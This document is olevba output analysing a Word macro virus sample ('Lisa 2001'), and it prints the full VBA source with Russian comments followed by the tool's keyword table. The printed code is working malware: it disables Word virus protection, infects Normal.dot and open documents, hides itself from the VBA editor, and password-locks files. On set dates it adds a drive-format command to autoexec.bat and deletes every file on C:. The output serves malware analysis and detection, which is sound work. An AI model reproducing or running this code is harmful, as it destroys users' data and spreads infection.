olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'L i s a 2001
'Все пожелания (а также новые вири) слать на Slava_Atrancev@mail.ru
Dim dvl
Private Sub Document_Close()
 dvl = 2
 p
End Sub
Private Sub Document_New()
 dvl = 3
 p
End Sub
Private Sub Document_Open()
 dvl = 1
 p
End Sub

Private Sub p()
 '___Включаем генератор случайных чисел___'
 Randomize
 '___Вырубаем ошибки___'
 On Error Resume Next
 '___Отключение защиты от вирусов для ворда 97___'
 Application.Options.VirusProtection = False
 '___Отключение защиты от вирусов для ворда 2000___'
 System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security", "level") = 1
 If ThisDocument.Name <> "Normal.dot" Then
  '___Если выполняется не из нормала то ...___'
  '___Вытираем нормал дот___'
  a = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a
  '___Пишем в нормал дот наш код___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a)
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines 1, b
  '___Добавляем в нормал технологию стелс___'
  c = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 1, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 2, "On Error Resume Next"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 3, "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 4, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 5, "NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 6, "c = Application.Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 7, "For i = 1 To c"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 8, "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 9, "If d > 0 Then"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 10, "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 11, "Application.Documents.Item(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 12, "End If"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 13, "Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 14, "Application.ShowVisualBasicEditor = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 15, "End Sub"
  '___Мелкая пакость антивирусникам, при закрытии паролируем документ на изменение, а при открытии снимаем пароль и после лечения, юзверь не сможет юзать этот файл___'
  If dvl = 2 Then
   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:="hgfiviieundj"
  End If
  If dvl = 1 Then
   ThisDocument.Unprotect Password:="hgfiviieundj"
  End If
 Else
  '___Если выполняется из нормала то ...___'
  '___Запоминаем код без процедуры стелс___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  d = ""
  For i = 1 To a
   b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   If b = "Sub viewvbcode()" Then i = a + 1 Else d = d + b + Chr(13)
  Next i
  '___Пишем код во все открытые файлы___'
  a = Application.Documents.Count
  For i = 1 To a
   b = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, b
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.insertlines 1, d
  Next i
 End If
 '___Проверяем наличие метки "Свой-Чужой"
 Set a = Application.FileSearch
 Set b = Application.FileSearch
 With a
  .LookIn = "c:\windows\system\"
  .FileName = "lisa.dll"
  '___Если метки нет, убиваем все подряд___'
  If .Execute = 0 Then
   If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) _
   Or (Day(Now()) = 10) And (Month(Now()) = 1) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 7) Or (Day(Now()) = 13) And (Month(Now()) = 12) Then
    Open "c:\autoexec.bat" For Append As #1
     Print #1, "echo y|FORMAT c: /q >nul"
    Close #1
    With b
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
   End If
  End If
 End With
End Sub


















































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lisa.dll            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

